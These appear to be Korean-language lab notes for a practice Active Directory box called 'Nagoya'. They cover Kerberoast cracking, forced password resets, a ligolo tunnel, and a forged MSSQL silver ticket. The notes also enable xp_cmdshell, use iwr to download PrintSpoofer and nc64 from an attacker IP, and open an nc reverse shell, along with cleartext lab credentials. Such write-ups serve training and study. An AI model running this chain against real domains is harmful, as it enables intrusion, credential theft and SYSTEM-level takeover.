OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 11147/22294 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (20395 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*$6f15123e21a1df6ae63fc333287e9043$d952b84710651a54baa879d839c5cce61e18c3c495ecbd93abde51dae0079da79dc12e7fb136501d19ba16131a998bd805e038d879a9351d95fda2d5b69095069acabb63df33e64c22b6ef547a72daa6ba35e2e70573c2b5ff88848271071bd3bd9ab134aa7ff82bd14ec8122cdf7e388f7a82ffc63a2c9578183abba7399fc445fbc7fac8dfc864379c26583083082014d7d8d47c6fc920bd4f2f58342bea04eb3b30afc9e5fc53b643695cbc55226a93f2068cb42695f1377799b003a50205b10d700acb240c0586fc07c03755c2e2f4ac55ce8dd10069ec941c41d66176d5b0f013fc95c32f2c96e37fe183a8e01eca9e95d0c22c8eafb6c81ae087ed714380306f335d3e223a35fee0b6c51ab378081ba486c0a59c9b66a28571aeaea830623f230e9348be71f102c1396b0032ceed57115d3eb7b838da833b5f6fab8453351f62408e33fabe64cf01992b1a5c0d550e5ab65dc4853cbaa96324636ffeed2277685aafdadf8bd375fa98d1e10b3aaf54e73f3211c12b794a4b56ea086e16777d799585e13fec0101badb598bb5ca76f1d056ba9ba8d20874d9487e41a0550addf8ee996630770762534510de7a1807ec08b3b24cbb962f59365ebee2af08f8a3decc8b17365624e45c5b4ab4367da929cdfa651c0235402c597d6fe4e962426c7e548da1327c902f3e36aa5c1e97bd793ccc6a28ea8dfb4d73ae00ecf96a4d0595b70af2521f037ef849cdc4820bd6a09398d766820d22182cad5e53f273525e4e6d9a39981fdd3fe010865a46249b2c10fddc366adfda4f36c225e4de29ea1d39554ceedd5d3c9bdea1da67ac28ad2b33942d35b29638239276a06aa01fe148ffc7f83b9f7833402e5f48e8cfb2968dc79d8b0f709bdbd1d86fb3be59e8830831403d66c1bad00245c988987c1cf10ec9f3fc12ffd1eace7167369859ec778c174b78d9dff76c8892d9e347cb058c778bc17e100ee92da6e3295b02e01d57f4ad3a53faf971e5b480581ea2c3cd5245a0f9e5feca60495e4bf5d2997419b12af71dc9807609aaed28f8ee95f0c5057aa9bd5df17d36856356b7562f745dea43d9c2124d99589933beccf79f7f33a62202308cc542be5146ee6cdc79c4153552c38d60c42905de08f6fbb20efafa79b1cb049da42701b9c30289a0b162c1b9393ecefd194b757ead1cb0b0596a2fbba18857577de944bae022d14cb7e6dc2fe43f7807270b4c75b07904a701c5d9f86f4d85d3e1ea1d0bbb9fb9271f57d3c86ad8653a523f16fb119e0558b7669f5a6a2373583dcda379649cfcc9f358721584c9747282410f3fc861aa52ac6a246ac899cf4ba476397cf699ec9530803791d7ee9f729d717faacbb013e52b095bbaed6f4fcc8b24ca9e70ab11a43091c1bf162b660f89c2667f9ddddd494f008885bfa2758cc5a95fff0da697750fc56943f31ada247cd418dcc6138a3c433e0abd051eaf6afae03d9a35f1ecd7237db41ea55fdd85aa738cf4ed4ec2d25dfa8e4323b6f3ebf783694272e70ea07b9520f22e5b7458de9a2b740a517feb00ac077eeb9c1150ccb168de49aea691ac7ce34adb238da2104ffe723a4779116ec98c:Service1
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: hash.txt
Time.Started.....: Mon Jul  6 15:56:03 2026 (9 secs)
Time.Estimated...: Mon Jul  6 15:56:12 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1724.0 kH/s (1.28ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
Rejected.........: 0/28688770 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 67%

Started: Mon Jul  6 15:56:02 2026
Stopped: Mon Jul  6 15:56:13 2026
```

확보한 SVC_MSSQL 확인
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ nxc-sweep 192.168.120.21 -u svc_mssql -p 'Service1'
[*] Starting NXC sweep for 192.168.120.21 as svc_mssql ...

[+] Port 445 open. Checking smb ...
SMB         192.168.120.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.120.21  445    NAGOYA           [+] nagoya-industries.com\svc_mssql:Service1
SMB         192.168.120.21  445    NAGOYA           [*] Enumerated shares
SMB         192.168.120.21  445    NAGOYA           Share           Permissions     Remark
SMB         192.168.120.21  445    NAGOYA           -----           -----------     ------
SMB         192.168.120.21  445    NAGOYA           ADMIN$                          Remote Admin
SMB         192.168.120.21  445    NAGOYA           C$                              Default share
SMB         192.168.120.21  445    NAGOYA           IPC$            READ            Remote IPC
SMB         192.168.120.21  445    NAGOYA           NETLOGON        READ            Logon server share
SMB         192.168.120.21  445    NAGOYA           SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.120.21  5985   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
WINRM       192.168.120.21  5985   NAGOYA           [-] nagoya-industries.com\svc_mssql:Service1

[+] Port 3389 open. Checking rdp ...
RDP         192.168.120.21  3389   NAGOYA           [*] Windows 10 or Windows Server 2016 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com) (nla:False)
RDP         192.168.120.21  3389   NAGOYA           [+] nagoya-industries.com\svc_mssql:Service1

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```

3389를 시도했지만 로그인 불가

```bash
ssh -L 13389:192.168.120.21:3389 kali@192.168.164.130
```

bloodhound 확인 후 christopher.lewis 획득으로 전환

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ net rpc password "iain.white" 'Password123!' -U "nagoya-industries.com/craig.carr%Spring2023" -S 192.168.120.21
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ net rpc password 'christopher.lewis' 'Password123!' -U 'nagoya-industries.com/iain.white%Password123!' -S 192.168.120.21
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ evil-winrm -i 192.168.120.21 -u christopher.lewis -p 'Password123!'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> whoami
nagoya-ind\christopher.lewis
```


포트포워딩 구성
```bash
# (1) ligolo 인터페이스 UP
sudo ip link set ligolo up

# (2) 타깃 로컬호스트로 가는 라우트 (이미 있으면 에러나도 무시)
sudo ip route add 240.0.0.1/32 dev ligolo

# (3) 프록시 실행 — 이 창이 ligolo 콘솔이 됨
./proxy -selfcert -laddr 0.0.0.0:11601
```
![[Pasted image 20260707103550.png]]

에이전트 실행
```powershell
# 에이전트 아직 안 올렸으면
upload agent.exe

# 칼리로 연결 (★ <tun0IP>를 위에서 확인한 실제 IP로!)
.\agent.exe -connect <tun0IP>:11601 -ignore-cert
```
![[Pasted image 20260707103620.png]]
세션선택 및 터널 시작
```bash
session          # 목록에서 방금 들어온 에이전트 번호 선택
start            # ← 이걸 쳐야 터널이 열림 (인터페이스 물으면 ligolo 선택)
```
![[Pasted image 20260707103631.png]]
칼리 검증
```bash
ip route | grep 240        # 'linkdown' 없어야 함 → 'dev ligolo scope link'만
nc -zv 240.0.0.1 1433      # 'open' 이면 성공 (타깃의 127.0.0.1:1433에 연결됨)
```
![[Pasted image 20260707103642.png]]


도메인 SID 얻기 (WinRM)
```powershell
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> [System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid.Value
S-1-5-21-1969309164-1513403977-1686805993
```
![[Pasted image 20260707103653.png]]


NT해시 - 평문 비번을 NT해시로
```bash
python3 -c 'import hashlib;print(hashlib.new("md4","Service1".encode("utf-16le")).hexdigest())'
# 또는 secretsdump 하면 해시가 직접 나옴 (평문 없이 -nthash에 바로 사용)
```
![[Pasted image 20260707111021.png]]

도메인 SID (여러방법)
```bash
Get-ADDomain | Select DomainSID                       # 박스에서
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid.Value
whoami /user                   # S-1-5-21-A-B-C-RID → 마지막 RID 빼면 도메인 SID

impacket-lookupsid nagoya-industries.com/craig.carr:Spring2023@192.168.120.21   # 칼리에서
```
![[Pasted image 20260707111134.png]]

도메인 FQDN
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ nxc smb 192.168.120.21 -u USER -p PASS # 출력에 (domain:nagoya-industries.com)
SMB         192.168.120.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\USER:PASS STATUS_LOGON_FAILURE
```

SPN - kerberoast 출력
```bash
impacket-GetUserSPNs nagoya-industries.com/USER:PASS -dc-ip <DC>   # ServicePrincipalName 열
setspn -L svc_mssql                                                # 박스에서
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
```

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-GetUserSPNs nagoya-industries.com/svc_mssql:Service1 -dc-ip 192.168.120.21
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                Name          MemberOf                                          PasswordLastSet             LastLogon                   Delegation
----------------------------------  ------------  ------------------------------------------------  --------------------------  --------------------------  ----------
http/nagoya.nagoya-industries.com   svc_helpdesk  CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com  2023-04-30 16:31:06.190955  <never>
MSSQL/nagoya.nagoya-industries.com  svc_mssql                                                       2023-04-30 16:45:33.288595  2024-08-02 10:48:41.441299
```

![[Pasted image 20260707111345.png]]


실버티켓 위조`S-1-5-21-1969309164-1513403977-1686805993`
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c \
  -domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
  -domain nagoya-industries.com \
  -spn MSSQL/nagoya.nagoya-industries.com \
  -user-id 500 Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for nagoya-industries.com/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
![[Pasted image 20260707103942.png]]

티켓으로 MSSQL 접속
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ export KRB5CCNAME=$PWD/Administrator.ccache

┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ klist
Ticket cache: FILE:/home/kali/PG/Nagoya/Administrator.ccache
Default principal: Administrator@NAGOYA-INDUSTRIES.COM

Valid starting       Expires              Service principal
07/07/2026 10:39:08  07/04/2036 10:39:08  MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM
        renew until 07/04/2036 10:39:08

┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-mssqlclient nagoya.nagoya-industries.com -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (NAGOYA-IND\Administrator  dbo@master)>
```

![[Pasted image 20260707104049.png]]

접속 되면 쉘 획득
```bash
SQL (NAGOYA-IND\Administrator  dbo@master)> enable_xp_cmdshell
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (NAGOYA-IND\Administrator  dbo@master)> RECONFIGURE
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami
output
--------------------
nagoya-ind\svc_mssql

NULL
```

![[Pasted image 20260707104209.png]]

쉘 획득 후 권한 확인
```powershell
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami /priv
output
--------------------------------------------------------------------------------
NULL

PRIVILEGES INFORMATION

----------------------

NULL

Privilege Name                Description                               State

============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled

SeMachineAccountPrivilege     Add workstations to domain                Disabled

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

SeCreateGlobalPrivilege       Create global objects                     Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

NULL

```

바이너리 호스팅 + 리스너 `PrintSpoofer64.exe`, `nc64.exe`

```powershell
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell powershell -c "iwr http://192.168.45.175/PrintSpoofer64.exe -outfile C:\programdata\ps.exe;
output
------
NULL

SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell powershell -c "iwr http://192.168.45.175/nc64.exe -outfile C:\programdata\nc64.exe";
output
------
NULL
```
![[Pasted image 20260707105403.png]]

리버스쉘 대기
```bash 
rlwrap nc -lnvp 9001
```
![[Pasted image 20260707105415.png]]

쉘 실행
```powershell
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell C:\programdata\ps.exe -c "C:\programdata\nc64.exe 192.168.45.175 9001 -e cmd.exe"
output
-------------------------------------------
[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL
```

![[Pasted image 20260707105425.png]]

쉘 획득
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.120.21] 50031
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![[Pasted image 20260707105454.png]]

flag 확인
![[Pasted image 20260707105621.png]]


